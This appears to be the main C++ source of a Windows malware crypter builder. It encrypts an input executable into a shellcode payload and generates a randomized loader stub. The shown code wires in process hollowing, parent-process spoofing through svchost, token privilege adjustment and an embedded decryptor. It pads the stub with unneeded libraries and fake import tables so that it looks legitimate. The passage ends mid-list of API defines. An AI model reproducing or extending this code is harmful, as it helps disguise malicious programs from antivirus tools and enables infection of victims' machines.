#include "config.h"

#include <windows.h>
#include <tchar.h>
#include <intrin.h>
#include <Strsafe.h>

#include "globals.h"
#include "resource.h"
#include "decryptor.h"

#include "mCompiler.h"
#include "mPathBuilder.h"
#include "mResourceBuilder.h"
#include "mConfigLoader.h"
#include "mOutputPatcher.h"
#include "mImport.h"
#include "ApiHashGenerator.h"
#include "StubFunctions.h"

#pragma warning(disable:C4200)

mConfig config;
mRandom random;
mRandom random2;
mImport import;
DWORD   max_build_procs = 0;

DWORD64 origSeed;
DWORD64 genSeed;

PWCHAR	pw;

void _tmain(int argc,PTCHAR argv[])
{
	if( argc < 3 )
	{
		_tprintf(_T("Usage: %s <in_file> <out_file> [<seed>] [<config_file>]"), basename(argv[0])); 
		return;
	}

	int arg_i = 0;
	PWCHAR	arg_in = 0, arg_out = 0, arg_seed = 0, arg_config = 0;
	PWCHAR	arg_out_seed = 0;

	//==========================================================
	//	parse commandline
	//==========================================================
	for (arg_i = 0; arg_i<argc; arg_i++)
	{
		if (wcscmp(argv[arg_i], L"-in") == 0)  arg_in = argv[arg_i + 1];
		if (wcscmp(argv[arg_i], L"-out") == 0) arg_out = argv[arg_i + 1];
		if (wcscmp(argv[arg_i], L"-cfg") == 0) arg_config = argv[arg_i + 1];
		if (wcscmp(argv[arg_i], L"-seed") == 0)	arg_seed = argv[arg_i + 1];
	};

	/*printf("\n IN : %S", arg_in);
	printf("\n OUT: %S", arg_out);
	printf("\n CFG: %S", arg_config);
	printf("\n DNA: %S", arg_seed);
	printf("\n input seed: 0x%I64X \n", genSeed);*/

	if (arg_seed)
	{
		swscanf(arg_seed, L"0x%I64X", &genSeed);
		random.set_seed(genSeed);
	}

	origSeed = random.get_seed();

	StringReplace(arg_out, L".exe", L"");
	int n = wcslen(arg_out);
	swprintf(&arg_out[n], L"_0x000%I64X.exe", origSeed);
	//printf("\n OUT: %S \n", arg_out);

#ifdef _DEBUG
//...
#endif

	// check absolute path, if no convert
	if( arg_out && arg_out[1]!=_T(':') )
	{
		PTCHAR path = (PTCHAR)halloc(MAX_PATH*sizeof(TCHAR));

		DWORD length = GetCurrentDirectory(MAX_PATH, path);
		if( arg_out[0]!=_T('/') && arg_out[0]!=_T('\\') )
		{
			lstrcat(path,_T("\\"));
		}

		lstrcat(path, arg_out);

		arg_out = path;
	}


	_tprintf(_T("Input:  %s\n"), arg_in);
	_tprintf(_T("Output: %s\n"), arg_out);

	if( arg_config )
		_tprintf(_T("Config: %s\n"), arg_config);

	_tprintf(_T("Seed: 0x%0.8X %0.8X (%d)\n"), (DWORD)(random.get_seed() >> 32), (DWORD)random.get_seed(), (DWORD)random.get_seed());

	DeleteFile(arg_out);

	PMBUF idata = file_get_contents(arg_in);
	if( !idata )
	{
#ifdef _DEBUG
	//	__debugbreak();
#endif
		_tprintf(_T("Error: Can not load %s file!"),arg_in);
		return;
	}

	PIMAGE_DOS_HEADER orig_dos = (PIMAGE_DOS_HEADER)file2image(idata->data);
	if( orig_dos->e_magic!=IMAGE_DOS_SIGNATURE )
	{
		_tprintf(_T("Error: file not have dos signature!\r\n"));
		return ;
	}

	PIMAGE_NT_HEADERS orig_nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)orig_dos + orig_dos->e_lfanew);
	if( orig_nt->Signature!=IMAGE_NT_SIGNATURE )
	{
		_tprintf(_T("Error: file not have nt signature!\r\n"));
		return ;
	}

	mConfigLoader cfg_loader(&config, orig_dos);

	if( arg_config )
	{
		if( !cfg_loader.load_from_file(arg_config) )
		{
			_tprintf(_T("Error: config load error. %s\n"), cfg_loader.get_error());
#ifdef _DEBUG
			__debugbreak();
#endif
			return;
		}
	}else{
		cfg_loader.load_default();
	}

	import.load_config();

	if( random.get_less(0,1) )
	{
		import.set_procs_type(IPT_A);
	}else{
		import.set_procs_type(IPT_W);
	}

	max_build_procs = random.get_less(config.code.block_call.count.min, config.code.block_call.count.max);

	DWORD64 rand_name;
	DWORD	pid;

#ifdef CONFIG_DEBUG_SOURCE
	rand_name = 0;
	pid = 0;
#else
	rand_name = random.get();
	pid = GetCurrentProcessId();
#endif

	mVars			globals(VARS_TYPE_GLOBALS, NULL);
	mPathBuilder	path_builder(pid, rand_name);

	// create uniq tmp folder in tmp/ for build, all cpp, bat, rc, res will be in it
	if( !path_builder.create_tmp_folder() )
		return;

	makeApiHash(random.get_seed(), path_builder);

	mCompiler compiler(&path_builder, idata->data);
	mResourceBuilder resource(&path_builder);
	mCode stub(0xFFFF);

	mFunction ep(&globals), _runPayload(&globals, true),
		_hollowedProcess(&globals, true), _adjustTokenCurrProc(&globals, true),
		_createProcessAndSpoofParent(&globals, true), _getSvchostPid(&globals, true), 
		_setDefaultCurrentDirectory(&globals, true), _getProcessUsername(&globals, true);

	ep.disableOptimization();

	StubFunctions::Build::Declaration::runPayload(&_runPayload);
	StubFunctions::Build::Declaration::createHollowedProcess(&_hollowedProcess);
	StubFunctions::Build::Declaration::adjustTokenCurrentProcess(&_adjustTokenCurrProc);
	StubFunctions::Build::Declaration::createProcessAndSpoofParent(&_createProcessAndSpoofParent);
	StubFunctions::Build::Declaration::getSvchostPid(&_getSvchostPid);
	StubFunctions::Build::Declaration::getProcessSid(&_getProcessUsername);
	StubFunctions::Build::Declaration::setDefaultCurrentDirectory(&_setDefaultCurrentDirectory);

	if ( orig_nt->FileHeader.Characteristics & IMAGE_FILE_DLL )
	{
		ep.set_return(MVT_BOOL);
		ep.set_convention(FC_STDCALL);

		if( config.not_use_crt_stub )
		{
			ep.set_name("NostubDllMain");
			compiler.set_entry_point("NostubDllMain");
		}else{
			ep.set_name("DllMain");
		}

		ep.add_formal(MVT_HINSTANCE, "hInstance" ,	MVF_INITIALIZED | MVF_UNKNOWN_VALUE, NULL);
		ep.add_formal(MVT_UINT32,	 "Reason",		MVF_INITIALIZED | MVF_UNKNOWN_VALUE, NULL);
		ep.add_formal(MVT_UINT32,	 "Reserved",	MVF_INITIALIZED | MVF_UNKNOWN_VALUE, NULL);
	}else{
		ep.set_return(MVT_INT32);
		ep.set_convention(FC_STDCALL);

		if( config.not_use_crt_stub )
		{
			ep.set_name("NostubWinMain");
			compiler.set_entry_point("NostubWinMain");
		}else{
			if( import.get_procs_type()==IPT_A )
			{
				ep.set_name("WinMain");
			}else{
				ep.set_name("wWinMain");
			}

			ep.add_formal(MVT_HINSTANCE,"hInstance" ,	 MVF_INITIALIZED | MVF_UNKNOWN_VALUE, NULL);
			ep.add_formal(MVT_HINSTANCE,"hPrevInstance", MVF_INITIALIZED | MVF_UNKNOWN_VALUE, NULL);

			if( import.get_procs_type()==IPT_A )
			{
				ep.add_formal(MVT_PCHAR,	"cmdLine",		 MVF_INITIALIZED | MVF_UNKNOWN_VALUE, NULL);
			}else{
				ep.add_formal(MVT_PWCHAR,	"cmdLine",		 MVF_INITIALIZED | MVF_UNKNOWN_VALUE, NULL);
			}

			ep.add_formal(MVT_INT32,	"cmdCount",		 MVF_INITIALIZED | MVF_UNKNOWN_VALUE, NULL);
		}
	}

	mCode			gen_code(0xFFFF);
	mPayloadChunks	payload;
	mOutputPatcher	patcher(arg_out);

	dbg_tset();

	PMCODE_BLOCK continue_block = ep.generate(5,10, IS_START_EP);

	StubFunctions::Build::Body::runPayload(&_runPayload);
	StubFunctions::Build::Body::createHollowedProcess(&_hollowedProcess);
	StubFunctions::Build::Body::adjustTokenCurrentProcess(&_adjustTokenCurrProc);
	StubFunctions::Build::Body::createProcessAndSpoofParent(&_createProcessAndSpoofParent);
	StubFunctions::Build::Body::getSvchostPid(&_getSvchostPid);
	StubFunctions::Build::Body::getProcessSid(&_getProcessUsername);
	StubFunctions::Build::Body::setDefaultCurrentDirectory(&_setDefaultCurrentDirectory);

	// add shellcode decryptor
#ifndef CONFIG_DEBUG_EMULATOR
	add_decryptor(ep.get_code_generator(), continue_block, &patcher, idata, &payload);
#endif

	mCodeLines lines(ep.get_code_generator(), continue_block);

	// add extend data, to resize image, because crypted_image_size >= orig_image_size
#ifdef CONFIG_DEBUG_EMULATOR
	lines.add("ExitProcess(0);\r\n");
#endif

	if( orig_nt->FileHeader.Characteristics & IMAGE_FILE_DLL )
	{
		lines.add_ex(MCODELINE_FLAG_NO_TRASH, "return TRUE;\r\n");
	}else{
		ep.set_return(MVT_INT32);
	}

	dbg(_T("Generation time: %d sec\n"), dbg_tget());

	dbg_tset();

	resource.generate_manifest_uac(); // create uac data
	resource.generate_version_info();

	PMPAYLOAD_CHUNK chunk;

	if( ldr_restore_compiled && (chunk = payload.get_chunk(PAYLOAD_CHUNK_RCDATA)) )
	{
		PMBUF all_data = (PMBUF)mem_alloc(ldr_restore_compiled->size + chunk->entr_size);
		if( all_data )
		{
			mem_copy(all_data->data, ldr_restore_compiled->data, ldr_restore_compiled->size);
			mem_copy(&all_data->data[ldr_restore_compiled->size], chunk->entr_data, chunk->entr_size);

			all_data->size = ldr_restore_compiled->size + chunk->entr_size;

			resource.add_rcdata(1, all_data->data, all_data->size);

			mem_free(all_data);
		}
	}

	resource.save_resource(); // save .rc file in tmp/<rand>/ folder

	if( !resource.is_empty() )
		compiler.add_resource();

#ifdef _DEBUG

	// only needed for build_pause.bat it's for manual building aka debug
	if( patcher.get_count() )
	{
		mCode pline(4096);

		PCHAR sdata = patcher.serialize();
		PMSTRA out = mCode::convert_ascii(arg_out, -1);

		pline << "patcher.exe \"" << out->string << "\" patcher.dat\r\n";

		compiler.add_pause_line_ex( pline.get() );

		CHAR path[MAX_PATH];

		lstrcpyA(path, path_builder.get_tmp_folder());
		lstrcatA(path, "patcher.dat");

		file_put_contentsA(path, sdata, lstrlenA(sdata));

		hfree(sdata);
		hfree(out);
	}

#endif

	DWORD image_size = 0;

	DWORD rdata_size = 0;
	DWORD data_size  = 0;
	DWORD total_size;

	DWORD rdata_pos = 0;
	DWORD data_pos  = 0;

	BOOL extend_vars_added = false;

	for(DWORD compile_try = 0; image_size < orig_nt->OptionalHeader.SizeOfImage; compile_try++ )
	{
		if( image_size!=0 )
		{
			_tprintf(_T("Make corrections, rebuilding...\r\n"));
		}

		stub.clear();

		stub << 
			"\r\n"
			"//=============================================================\r\n"
			"//= Includes Part\r\n"
			"//=============================================================\r\n"
			"#include <intrin.h>\r\n"
			"#include <Objbase.h>\r\n"
			"#include <Callobj.h>\r\n"
			"#include <Shellapi.h>\r\n"
			"#include <Urlmon.h>\r\n"
			"#include <Prsht.h>\r\n"
			"#include <Userenv.h>\r\n"
			"#include <Commctrl.h>\r\n"
			"#include <Shlwapi.h>\r\n"
			"#include <Shlobj.h>\r\n"
			"#include <Intshcut.h>\r\n"
			"#include <Ole2.h>\r\n"
			"#include <GuidDef.h>\r\n"
			"#include <Olectl.h>\r\n"
			//"#include <Sisbkup.h>\r\n"
			"#include <ctype.h>\r\n"
			"#include <cstring>\r\n"
			"#include <windows.h>\r\n"
			"#include <tchar.h>\r\n"
			"#include \"shlwapi.h\"\r\n"
			"#include \"ShlObj.h\"\r\n"
			"#include \"WinUser.h\"\r\n"
			"#include <intsafe.h>\r\n"
			"#include <locale.h>\r\n"
			"#include <setjmp.h>\r\n"
			"#include <time.h> \r\n"
			"#include <locale.h>\r\n"
			"#include <assert.h>\r\n"
			"#include <windows.h>\r\n"
			"#include <stdio.h>\r\n"
			"#include <math.h>\r\n"
			//"#include <Ntsecapi.h>\r\n"
			"#include <Wininet.h>\r\n"
			"#include <Dbghelp.h>\r\n"
			"#include <Wincrypt.h>\r\n"
			"#include <Commctrl.h>\r\n"
			"#include <ClusApi.h>\r\n"
			"#include <Winver.h>\r\n"
			"#include <Psapi.h>\r\n"
			"#include <Winnetwk.h>\r\n"
			"#include <process.h>\r\n"
			"#include <conio.h> \r\n"
			"#include <shlwapi.h>\r\n"
			"#include <stdlib.h>\r\n"
			"#include <malloc.h>\r\n"
			"#include <time.h>\r\n"
			"#include <gl/gl.h>\r\n"
			"#include <signal.h>\r\n"
			"#include <Tlhelp32.h>\r\n"
			"#include <oledlg.h>\r\n"
			"#include <commctrl.h>\r\n"
			"#include <wchar.h>\r\n"
			"#include <locale.h>\r\n"
			"#include <ctype.h>\r\n"
			"#include <stdarg.h>\r\n"
			"#include <gdiplus.h>\r\n"
			"#include <Uxtheme.h>\r\n"
			"#include \"GetApi.h\"\r\n"
			"#include \"..\\..\\..\\..\\Andrivet\\MetaString.h\"\r\n"
			"#include \"..\\..\\..\\..\\symbols.h\"\r\n"
			"\r\n"
			"//=============================================================\r\n"
			"//= Libs includes Part\r\n"
			"//=============================================================\r\n"
			"#pragma comment(lib,\"user32.lib\")\r\n"
			"#pragma comment(lib,\"Comdlg32.lib\")\r\n"
			"#pragma comment(lib,\"UrlMon.lib\")\r\n"
			"#pragma comment(lib,\"Shell32.lib\")\r\n"
			"#pragma comment(lib,\"oledlg.lib\")\r\n"
			"#pragma comment(lib,\"Ole32.lib\")\r\n"
			"#pragma comment(lib,\"AdvApi32.lib\")\r\n"
			"#pragma comment(lib,\"WinInet.lib\")\r\n"
			"#pragma comment(lib,\"Gdi32.lib\")\r\n"
			"#pragma comment(lib,\"WS2_32.lib\")\r\n"
			"#pragma comment(lib,\"opengl32.lib\")\r\n"
			"#pragma comment(lib,\"Dbghelp.lib\")\r\n"
			"#pragma comment(lib,\"Crypt32.lib\")\r\n"
			"#pragma comment(lib,\"Comctl32.lib\")\r\n"
			"#pragma comment(lib,\"ClusApi.lib\")\r\n"
			"#pragma comment(lib,\"Version.lib\")\r\n"
			"#pragma comment(lib,\"Psapi.lib\")\r\n"
			"#pragma comment(lib,\"Mpr.lib\")\r\n"
			"#pragma comment(lib,\"credui.lib\")\r\n"
			"#pragma comment(lib,\"cryptui.lib\")\r\n"
			"#pragma comment(lib,\"msacm32.lib\")\r\n"
			"#pragma comment(lib,\"oleacc.lib\")\r\n"
			"#pragma comment(lib,\"secur32.lib\")\r\n"
			"#pragma comment(lib,\"shdocvw.lib\")\r\n"
			"#pragma comment(lib,\"snmpapi.lib\")\r\n"
			"#pragma comment(lib,\"traffic.lib\")\r\n"
			"#pragma comment(lib,\"winhttp.lib\")\r\n"
			"#pragma comment(lib,\"advpack.lib\")\r\n"
			"#pragma comment(lib,\"avifil32.lib\")\r\n"
			"#pragma comment(lib,\"bcrypt.lib\")\r\n"
			"#pragma comment(lib,\"bthprops.lib\")\r\n"
			"#pragma comment(lib,\"clfsw32.lib\")\r\n"
			"#pragma comment(lib,\"ComCtl32.lib\")\r\n"
			"#pragma comment(lib,\"DhcpCSvc.lib\")\r\n"
			"#pragma comment(lib,\"dhcpsapi.lib\")\r\n"
			"#pragma comment(lib,\"DnsAPI.lib\")\r\n"
			"#pragma comment(lib,\"dwmapi.lib\")\r\n"
			"#pragma comment(lib,\"esent.lib\")\r\n"
			"#pragma comment(lib,\"GdiPlus.lib\")\r\n"
			"#pragma comment(lib,\"HLink.lib\")\r\n"
			"#pragma comment(lib,\"httpapi.lib\")\r\n"
			"#pragma comment(lib,\"ImageHlp.lib\")\r\n"
			"#pragma comment(lib,\"Imm32.lib\")\r\n"
			"#pragma comment(lib,\"IPHlpApi.lib\")\r\n"
			//"#pragma comment(lib,\"irprops.lib\")\r\n"
			"#pragma comment(lib,\"MAPI32.lib\")\r\n"
			//"#pragma comment(lib,\"Mf_vista.lib\")\r\n"
			"#pragma comment(lib,\"Mfplat.lib\")\r\n"
			"#pragma comment(lib,\"Mprapi.lib\")\r\n"
			"#pragma comment(lib,\"Mscms.lib\")\r\n"
			//"#pragma comment(lib,\"mscoree.lib\")\r\n"
			//"#pragma comment(lib,\"mscorsn.lib\")\r\n"
			"#pragma comment(lib,\"msdrm.lib\")\r\n"
			"#pragma comment(lib,\"Msi.lib\")\r\n"
			"#pragma comment(lib,\"msvfw32.lib\")\r\n"
			"#pragma comment(lib,\"ncrypt.lib\")\r\n"
			"#pragma comment(lib,\"NetAPI32.lib\")\r\n"
			//"#pragma comment(lib,\"nmapi.lib\")\r\n"
			"#pragma comment(lib,\"NtDsAPI.lib\")\r\n"
			//"#pragma comment(lib,\"NTMSAPI.lib\")\r\n"
			"#pragma comment(lib,\"NtQuery.lib\")\r\n"
			"#pragma comment(lib,\"OleAut32.lib\")\r\n"
			"#pragma comment(lib,\"p2p.lib\")\r\n"
			"#pragma comment(lib,\"p2pgraph.lib\")\r\n"
			"#pragma comment(lib,\"Pdh.lib\")\r\n"
			"#pragma comment(lib,\"powrprof.lib\")\r\n"
			"#pragma comment(lib,\"propsys.lib\")\r\n"
			"#pragma comment(lib,\"RASAPI32.lib\")\r\n"
			"#pragma comment(lib,\"RASDlg.lib\")\r\n"
			"#pragma comment(lib,\"ResUtils.lib\")\r\n"
			"#pragma comment(lib,\"Rpcns4.lib\")\r\n"
			"#pragma comment(lib,\"Rtm.lib\")\r\n"
			"#pragma comment(lib,\"Rtutils.lib\")\r\n"
			"#pragma comment(lib,\"SetupAPI.lib\")\r\n"
			"#pragma comment(lib,\"ShLwApi.lib\")\r\n"
			"#pragma comment(lib,\"slc.lib\")\r\n"
			"#pragma comment(lib,\"SnmpAPI.lib\")\r\n"
			"#pragma comment(lib,\"Tapi32.lib\")\r\n"
			"#pragma comment(lib,\"UserEnv.lib\")\r\n"
			"#pragma comment(lib,\"Uxtheme.lib\")\r\n"
			"#pragma comment(lib,\"Vfw32.lib\")\r\n"
			"#pragma comment(lib,\"WdsClientApi.lib\")\r\n"
			"#pragma comment(lib,\"WebServices.lib\")\r\n"
			"#pragma comment(lib,\"wevtapi.lib\")\r\n"
			"#pragma comment(lib,\"WinBio.lib\")\r\n"
			"#pragma comment(lib,\"WinFax.lib\")\r\n"
			"#pragma comment(lib,\"winhttp.lib\")\r\n"
			"#pragma comment(lib,\"WinInet.lib\")\r\n"
			"#pragma comment(lib,\"WinMM.lib\")\r\n"
			"#pragma comment(lib,\"WinSCard.lib\")\r\n"
			"#pragma comment(lib,\"WinSpool.lib\")\r\n"
			"#pragma comment(lib,\"WinTrust.lib\")\r\n"
			"#pragma comment(lib,\"wlanapi.lib\")\r\n"
			"#pragma comment(lib,\"wscapi.lib\")\r\n"
			"#pragma comment(lib,\"wsdapi.lib\")\r\n"
			"#pragma comment(lib,\"wsmsvc.lib\")\r\n"
			"#pragma comment(lib,\"WSnmp32.lib\")\r\n"
			"#pragma comment(lib,\"WSock32.lib\")\r\n"
			"#pragma comment(lib,\"WtsApi32.lib\")\r\n"
			"\r\n"	
			"//=============================================================\r\n"
			"//= Static Import Part\r\n"
			"//=============================================================\r\n"
			"DWORD COMCTL3295_Array[] = { (DWORD)CreateToolbarEx, (DWORD)ImageList_Remove, (DWORD)ImageList_ReplaceIcon,\r\n"
			"(DWORD)InitCommonControlsEx, (DWORD)ImageList_Destroy, (DWORD)ImageList_Create, (DWORD)ImageList_SetBkColor};\r\n"
			"\r\n"
			"DWORD KERNEL32221_Array[] = {(DWORD)HeapCreate};\r\n"
			"\r\n"
			"DWORD USER3221_Array[] = { (DWORD)GetWindowLongA, (DWORD)wvsprintfA, (DWORD)SetWindowPos, (DWORD)FindWindowA,\r\n"
			"(DWORD)RedrawWindow, (DWORD)GetWindowTextA, (DWORD)EnableWindow, (DWORD)GetSystemMetrics,\r\n"
			"(DWORD)IsWindow, (DWORD)CheckRadioButton, (DWORD)UnregisterClassA, (DWORD)SetCursor,\r\n"
			"(DWORD)GetSysColorBrush, (DWORD)DialogBoxParamA, (DWORD)DestroyAcceleratorTable, (DWORD)DispatchMessageA,\r\n"
			"(DWORD)TranslateMessage, (DWORD)LoadIconA, (DWORD)EmptyClipboard, (DWORD)SetClipboardData, (DWORD)SetFocus,\r\n"
			"(DWORD)CharUpperA, (DWORD)OpenClipboard, (DWORD)IsDialogMessageA, (DWORD)TranslateAcceleratorA, (DWORD)GetMessageA,\r\n"
			"(DWORD)LoadAcceleratorsA, (DWORD)RemoveMenu, (DWORD)InvalidateRect, (DWORD)ChildWindowFromPoint, (DWORD)PostMessageA,\r\n"
			"(DWORD)DestroyCursor, (DWORD)CreateDialogParamA, (DWORD)GetWindowRect, (DWORD)IsMenu, (DWORD)GetSubMenu, (DWORD)SetDlgItemInt,\r\n"
			"(DWORD)GetWindowPlacement, (DWORD)CharLowerBuffA, (DWORD)EnableMenuItem, (DWORD)CheckMenuRadioItem, (DWORD)GetSysColor,\r\n"
			"(DWORD)KillTimer, (DWORD)DestroyIcon, (DWORD)DestroyWindow, (DWORD)PostQuitMessage, (DWORD)GetClientRect, (DWORD)MoveWindow,\r\n"
			"(DWORD)GetSystemMenu, (DWORD)SetTimer, (DWORD)SetWindowPlacement, (DWORD)InsertMenuItemA, (DWORD)GetMenu, (DWORD)CheckMenuItem,\r\n"
			"(DWORD)SetMenuItemInfoA, (DWORD)SetActiveWindow, (DWORD)DefDlgProcA, (DWORD)RegisterClassA, (DWORD)EndDialog, (DWORD)SetDlgItemTextA,\r\n"
			"(DWORD)EnumClipboardFormats, (DWORD)GetClipboardData, (DWORD)CloseClipboard, (DWORD)GetClassInfoA, (DWORD)CallWindowProcA,\r\n"
			"(DWORD)SetWindowLongA, (DWORD)IsDlgButtonChecked, (DWORD)SetWindowTextA, (DWORD)CheckDlgButton, (DWORD)GetActiveWindow, (DWORD)LoadCursorA,\r\n"
			"(DWORD)MessageBoxA, (DWORD)wsprintfA, (DWORD)GetDlgItemTextA, (DWORD)SendMessageA, (DWORD)GetCursorPos, (DWORD)TrackPopupMenu,\r\n"
			"(DWORD)ClientToScreen, (DWORD)DestroyMenu, (DWORD)CreatePopupMenu, (DWORD)AppendMenuA, (DWORD)SendDlgItemMessageA, (DWORD)GetDlgItem };\r\n"
			"\r\n"
			"DWORD GDI32121_Array[] = { (DWORD)GetObjectA, (DWORD)GetStockObject, (DWORD)DeleteObject, (DWORD)SetBkMode, (DWORD)SetTextColor, (DWORD)CreateFontIndirectA, (DWORD)SelectObject };\r\n"
			"\r\n"
			"DWORD comdlg3218_Array[] = { (DWORD)GetOpenFileNameA, (DWORD)GetSaveFileNameA };\r\n"
			"\r\n"
			"DWORD ADVAPI32214_Array[] = { (DWORD)RegCreateKeyA, (DWORD)RegSetValueA, (DWORD)GetUserNameA, (DWORD)RegCloseKey,\r\n"
			"(DWORD)RegOpenKeyExA, (DWORD)AdjustTokenPrivileges, (DWORD)LookupPrivilegeValueA, (DWORD)OpenProcessToken, (DWORD)RegQueryValueExA, (DWORD)RegDeleteKeyA };\r\n"
			"\r\n"
			"//=============================================================\r\n"
			"//= Fake API Defines for future calls them without transformation\r\n"
			"//=============================================================\r\n"
			"#define k_AreFileApisANSI (*(DWORD(WINAPI *)(VOID)) AreFileApisANSI)\r\n"
			"#define k_AssignProcessToJobObject (*(DWORD(WINAPI *)(DWORD,DWORD)) AssignProcessToJobObject)\r\n"
			"#define k_CancelWaitableTimer (*(DWORD(WINAPI *)(DWORD)) CancelWaitableTimer)\r\n"
			"#define k_ClearCommBreak (*(DWORD(WINAPI *)(DWORD)) ClearCommBreak)\r\n"
			"#define k_ClearCommError (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) ClearCommError)\r\n"
			"#define k_ConvertFiberToThread (*(DWORD(WINAPI *)(VOID)) ConvertFiberToThread)\r\n"
			"#define k_ConvertThreadToFiber (*(DWORD(WINAPI *)(DWORD)) ConvertThreadToFiber)\r\n"
			"#define k_CreateFiber (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) CreateFiber)\r\n"
			"#define k_CreateFiberEx (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) CreateFiberEx)\r\n"
			"#define k_CreateFileMappingW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) CreateFileMappingW)\r\n"
			"#define k_CreateIoCompletionPort (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) CreateIoCompletionPort)\r\n"
			"#define k_CreateMemoryResourceNotification (*(DWORD(WINAPI *)(DWORD)) CreateMemoryResourceNotification)\r\n"
			"#define k_CreateTapePartition (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) CreateTapePartition)\r\n"
			"#define k_CreateTimerQueue (*(DWORD(WINAPI *)(VOID)) CreateTimerQueue)\r\n"
			"#define k_DecodePointer (*(DWORD(WINAPI *)(DWORD)) DecodePointer)\r\n"
			"#define k_DecodeSystemPointer (*(DWORD(WINAPI *)(DWORD)) DecodeSystemPointer)\r\n"
			"#define k_DisableThreadLibraryCalls (*(DWORD(WINAPI *)(DWORD)) DisableThreadLibraryCalls)\r\n"
			"#define k_DisconnectNamedPipe (*(DWORD(WINAPI *)(DWORD)) DisconnectNamedPipe)\r\n"
			"#define k_EncodePointer (*(DWORD(WINAPI *)(DWORD)) EncodePointer)\r\n"
			"#define k_EncodeSystemPointer (*(DWORD(WINAPI *)(DWORD)) EncodeSystemPointer)\r\n"
			"#define k_EraseTape (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) EraseTape)\r\n"
			"#define k_EscapeCommFunction (*(DWORD(WINAPI *)(DWORD,DWORD)) EscapeCommFunction)\r\n"
			"#define k_FindFirstFileExW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) FindFirstFileExW)\r\n"
			"#define k_FindNextChangeNotification (*(DWORD(WINAPI *)(DWORD)) FindNextChangeNotification)\r\n"
			"#define k_FlushFileBuffers (*(DWORD(WINAPI *)(DWORD)) FlushFileBuffers)\r\n"
			"#define k_FlushInstructionCache (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) FlushInstructionCache)\r\n"
			"#define k_FlushViewOfFile (*(DWORD(WINAPI *)(DWORD,DWORD)) FlushViewOfFile)\r\n"
			"#define k_FreeResource (*(DWORD(WINAPI *)(DWORD)) FreeResource)\r\n"
			"#define k_GetCommMask (*(DWORD(WINAPI *)(DWORD,DWORD)) GetCommMask)\r\n"
			"#define k_GetCommModemStatus (*(DWORD(WINAPI *)(DWORD,DWORD)) GetCommModemStatus)\r\n"
			"#define k_GetCommTimeouts (*(DWORD(WINAPI *)(DWORD,DWORD)) GetCommTimeouts)\r\n"
			"#define k_GetCommandLineA (*(DWORD(WINAPI *)(VOID)) GetCommandLineA)\r\n"
			"#define k_GetCommandLineW (*(DWORD(WINAPI *)(VOID)) GetCommandLineW)\r\n"
			"#define k_GetCurrentProcess (*(DWORD(WINAPI *)(VOID)) GetCurrentProcess)\r\n"
			"#define k_GetCurrentProcessId (*(DWORD(WINAPI *)(VOID)) GetCurrentProcessId)\r\n"
			"#define k_GetCurrentThread (*(DWORD(WINAPI *)(VOID)) GetCurrentThread)\r\n"
			"#define k_GetCurrentThreadId (*(DWORD(WINAPI *)(VOID)) GetCurrentThreadId)\r\n"
			"#define k_GetFileAttributesExW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) GetFileAttributesExW)\r\n"
			"#define k_GetFileInformationByHandle (*(DWORD(WINAPI *)(DWORD,DWORD)) GetFileInformationByHandle)\r\n"
			"#define k_GetFileTime (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) GetFileTime)\r\n"
			"#define k_GetFileType (*(DWORD(WINAPI *)(DWORD)) GetFileType)\r\n"
			"#define k_GetLastError (*(DWORD(WINAPI *)(VOID)) GetLastError)\r\n"
			"#define k_GetLogicalDrives (*(DWORD(WINAPI *)(VOID)) GetLogicalDrives)\r\n"
			"#define k_GetMailslotInfo (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) GetMailslotInfo)\r\n"
			"#define k_GetModuleFileNameA (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) GetModuleFileNameA)\r\n"
			"#define k_GetModuleFileNameW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) GetModuleFileNameW)\r\n"
			"#define k_GetNamedPipeHandleStateA (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) GetNamedPipeHandleStateA)\r\n"
			"#define k_GetNamedPipeHandleStateW (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD,DWORD,DWORD)) GetNamedPipeHandleStateW)\r\n"
			"#define k_GetNamedPipeInfo (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) GetNamedPipeInfo)\r\n"
			"#define k_GetPriorityClass (*(DWORD(WINAPI *)(DWORD)) GetPriorityClass)\r\n"
			"#define k_GetProcessAffinityMask (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD)) GetProcessAffinityMask)\r\n"
			"#define k_GetProcessHandleCount (*(DWORD(WINAPI *)(DWORD,DWORD)) GetProcessHandleCount)\r\n"
			"#define k_GetProcessHeap (*(DWORD(WINAPI *)(VOID)) GetProcessHeap)\r\n"
			"#define k_GetProcessId (*(DWORD(WINAPI *)(DWORD)) GetProcessId)\r\n"
			"#define k_GetProcessIoCounters (*(DWORD(WINAPI *)(DWORD,DWORD)) GetProcessIoCounters)\r\n"
			"#define k_GetProcessPriorityBoost (*(DWORD(WINAPI *)(DWORD,DWORD)) GetProcessPriorityBoost)\r\n"
			"#define k_GetProcessTimes (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD,DWORD)) GetProcessTimes)\r\n"
			"#define k_GetProcessVersion (*(DWORD(WINAPI *)(DWORD)) GetProcessVersion)\r\n"
			"#define k_GetStdHandle (*(DWORD(WINAPI *)(DWORD)) GetStdHandle)\r\n"
			"#define k_GetTapeParameters (*(DWORD(WINAPI *)(DWORD,DWORD,DWORD,DWORD)) GetTapeParameters)\r\n"
			"#define k_GetTapeStatus (*(DWORD(WINAPI *)(DWORD)) GetTapeStatus)\r\n"
			"#define k_GetThreadContext (*(DWORD(WINAPI *)(DWORD,DWORD)) GetThreadContext)\r\n"
